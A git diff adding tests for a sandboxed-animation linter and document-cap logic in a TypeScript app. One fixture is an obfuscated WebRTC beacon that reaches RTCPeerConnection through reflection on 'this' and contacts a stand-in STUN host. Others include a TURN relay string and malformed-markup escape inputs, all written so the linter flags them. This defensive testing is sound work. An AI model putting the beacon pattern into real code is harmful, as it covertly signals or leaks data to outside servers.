@@ -17,6 +17,8 @@ import {
   renderDocument,
   replaceSection,
   scriptHash,
+  STE_TAB_KEY,
+  STE_TAB_LABEL,
   type DocBlock,
   type DocumentModel,
 } from '../../../../src/main/document';
@@ -26,6 +28,8 @@ import {
   ANIMATION_SHELL_CSS,
   ANIMATION_SHELL_JS,
   ANIMATION_SHELLS,
+  animationCodeProblems,
+  frameParsesAsBuilt,
   MAX_ANIMATION_CSS,
   MAX_ANIMATION_HTML,
   MAX_ANIMATION_JS,
@@ -235,6 +239,58 @@ describe('lint (design addendum: static lint, drop on a hit)', () => {
   });
 });
 
+describe('the shell cannot be swallowed by malformed markup (audit round 1)', () => {
+  const webrtc =
+    "var C = Object.getOwnPropertyNames(this).filter(function (k) { return k.indexOf('RTCP') === 0; })[0]; " +
+    "var pc = new (Object.getOwnPropertyDescriptor(this, C).value)({ iceServers: [{ urls: 'stun:' + 'beacon.example.net:3478' }] }); " +
+    "pc.createDataChannel('x'); pc.createOffer().then(function (o) { pc.setLocalDescription(o); });";
+
+  it.each([
+    ['an unclosed attribute quote', "<p class='"],
+    ['an unclosed double quote', '<p title="x'],
+    ['an unclosed comment', '<p>a</p><!-- x'],
+    ['a raw-text textarea', '<textarea>'],
+    ['a title', '<title>'],
+    ['a template', '<template><p>x'],
+    ['a noscript', '<noscript>'],
+    ['an xmp', '<xmp>'],
+    ['a plaintext', '<plaintext>'],
+    ['a stray main close', '</main><p>x</p>'],
+  ])('drops html with %s, and validity refuses the frame', (_, html) => {
+    expect(frameParsesAsBuilt({ js: PACKING_JS, html })).toBe(false);
+    expect(animationCodeProblems({ js: PACKING_JS, html })).toContain('markup:structure');
+    expect(parseAnimationSrcdoc(animationSrcdoc({ js: PACKING_JS, html }))).toBeNull();
+    expect(convert([{ ...A, html }]).out).toEqual([]);
+  });
+
+  it('keeps well-formed html and css (including unclosed p and li, which parse cleanly)', () => {
+    for (const html of [
+      '',
+      '<p>Hello</p>',
+      '<p>One<p>Two',
+      '<ul><li>a<li>b</ul>',
+      '<div class="x" title=\'a "b"\'></div>',
+    ])
+      expect(frameParsesAsBuilt({ js: PACKING_JS, html, css: 'p{color:red}' }), html).toBe(true);
+    expect(frameParsesAsBuilt(A)).toBe(true);
+  });
+
+  it('lints the WebRTC beacon through top-level this', () => {
+    const hits = lintAnimation({ js: webrtc });
+    expect(hits).toEqual(expect.arrayContaining(['js:ice-url', 'js:ice', 'js:this-global']));
+    expect(animationCodeProblems({ html: "<p class='", js: webrtc }).length).toBeGreaterThan(0);
+  });
+
+  it.each([
+    ['reflection over this', 'var k = Object.getOwnPropertyNames(this);'],
+    ['this.frames', 'var f = this.frames[0];'],
+    ['for-in over this', 'for (var k in this) go(k);'],
+    ['a TURN server string', "var s = 'turn:relay.example.net';"],
+  ])('flags %s', (_, js) => {
+    expect(lintAnimation({ js }).length, js).toBeGreaterThan(0);
+  });
+});
+
 describe('convert (07 §5.2)', () => {
   it('keeps a valid animation: text and code as given, poster sanitized', () => {
     const { out, warnings } = convert([A]);
@@ -424,6 +480,111 @@ describe('caps in merges (07 §5.2, §8.1)', () => {
   });
 });
 
+describe('ASD-STE100 mirrors and the caps (07 §5.1 step 2, §5.2; audit round 1)', () => {
+  const perTab = (m: DocumentModel): number[] =>
+    m.tabs.map((t) => t.sections.reduce((n, s) => n + s.blocks.filter((b) => b.type === 'animation').length, 0));
+  const marker: DraftBlock = {
+    type: 'animation',
+    title: A.title,
+    caption: A.caption,
+    alt: A.alt,
+    poster: ANIMATION_KEEP,
+    js: ANIMATION_KEEP,
+  };
+  // In depth 2, ELI5 2 (the document cap), STE mirrors both in-depth animations.
+  const steDoc = () => {
+    const two = (kind: 'indepth' | 'eli5'): DocumentDraftTab => ({
+      kind,
+      title: 'Animations',
+      sections: [section('One', para('Text 1.'), A), section('Two', para('Text 2.'), A)],
+    });
+    return buildDocumentModel({
+      ...fixtureInput('full'),
+      indepth: two('indepth'),
+      eli5: two('eli5'),
+      ste: {
+        tab: {
+          kind: 'ste',
+          title: 'Simple',
+          sections: [section('One', para('Text.'), A), section('Two', para('Text.'), A)],
+        },
+        origins: [],
+      },
+    });
+  };
+
+  it('build keeps the mirrors without spending the document cap', () => {
+    const r = steDoc();
+    expect(perTab(r.model)).toEqual([2, 2, 2]);
+    expect(r.warnings).not.toContain('animation-dropped');
+  });
+
+  it('regenerating a section with the keep marker never loses its animation to the mirrors', () => {
+    const { model } = steDoc();
+    for (const tab of model.tabs) {
+      const sec = tab.sections.find((s) => s.blocks.some((b) => b.type === 'animation'));
+      if (!sec) throw new Error('fixture');
+      const r = replaceSection(model, sec.id, section('Again', para('Reworded.'), marker), 'reexplain', NOW);
+      expect(r.warnings).not.toContain('animation-dropped');
+      expect(perTab(r.model)).toEqual([2, 2, 2]);
+    }
+  });
+
+  it('a new animation still respects the document cap (mirrors excluded)', () => {
+    const { model } = steDoc();
+    const sec = model.tabs[0]?.sections[0];
+    if (!sec) throw new Error('fixture');
+    const gone = replaceSection(model, sec.id, section('Again', para('No visual.')), 'reexplain', NOW);
+    expect(perTab(gone.model)).toEqual([1, 2, 2]);
+    const back = replaceSection(gone.model, sec.id, section('Again', para('New one.'), A), 'expand', NOW);
+    expect(back.warnings).not.toContain('animation-dropped');
+    expect(perTab(back.model)).toEqual([2, 2, 2]);
+  });
+
+  it('a merge does not count the STE tab it drops', () => {
+    const { prep } = wovenFixture();
+    const model = structuredClone(prep.target.model);
+    const [indepth, eli5] = model.tabs;
+    if (!indepth || !eli5) throw new Error('fixture');
+    const withOne = (secs: typeof indepth.sections) => {
+      let n = 0;
+      return secs.map((s) => (s.kind === 'content' && n++ < 1 ? { ...s, blocks: [...s.blocks, kept()] } : s));
+    };
+    indepth.sections = withOne(indepth.sections);
+    eli5.sections = withOne(eli5.sections);
+    const mirror = (i: number) => ({
+      id: `sec-ste-0000000${i}` as (typeof indepth.sections)[number]['id'],
+      kind: 'content' as const,
+      heading: `Mirror ${i}`,
+      blocks: [{ type: 'paragraph' as const, md: 'Text.' }, kept()],
+      origin: 'generated' as const,
+      updatedAt: NOW,
+    });
+    model.tabs.splice(2, 0, {
+      key: STE_TAB_KEY,
+      kind: 'ste',
+      label: STE_TAB_LABEL,
+      createdAt: NOW,
+      sections: [mirror(1), mirror(2)],
+    });
+    const plan = structuredClone(WEAVE_PLAN);
+    const ins = plan.indepth.insert[0];
+    if (!ins) throw new Error('fixture');
+    ins.blocks = [...ins.blocks, A];
+    plan.indepth.revise = [];
+    const r = applyMergePlan({ ...prep, target: { ...prep.target, model } }, plan, {
+      fromDocId: MERGE_SOURCE_ID,
+      fromTitle: MERGE_SOURCE_TITLE,
+      mergedAt: MERGED_AT,
+      idSource: new SeededIdSource(42),
+    });
+    expect(r.warnings).toContain('ste-dropped');
+    expect(r.warnings).not.toContain('animation-dropped');
+    // The new in-depth animation fits: 1 + 1 held before it, the two mirrors are not counted.
+    expect(perTab(r.model)[0]).toBe(2);
+  });
+});
+
 describe('the sandboxed frame (07 §6.2, §7.1)', () => {
   const b = kept();
   const html = renderAnimationFigure(b, 'sec-indepth-0000aaaa-b1');
@@ -489,6 +650,11 @@ describe('the sandboxed frame (07 §6.2, §7.1)', () => {
     expect(old).not.toBe(current);
     expect(parseAnimationSrcdoc(old)?.hashes).toEqual([sha(v1.js), sha(PACKING_JS)]);
     expect(parseAnimationSrcdoc(current)?.hashes).toEqual([sha(ANIMATION_SHELL_JS), sha(PACKING_JS)]);
+    // Older shells are read, never written: rendering an old frame's parts upgrades it to the
+    // current shell (as the runtime refresh on open does), so it does not round-trip byte for byte.
+    const parts = parseAnimationSrcdoc(old);
+    if (!parts) throw new Error('old frame did not parse');
+    expect(animationSrcdoc(parts)).toBe(current);
   });
 
   it('is deterministic and escapes model text', () => {
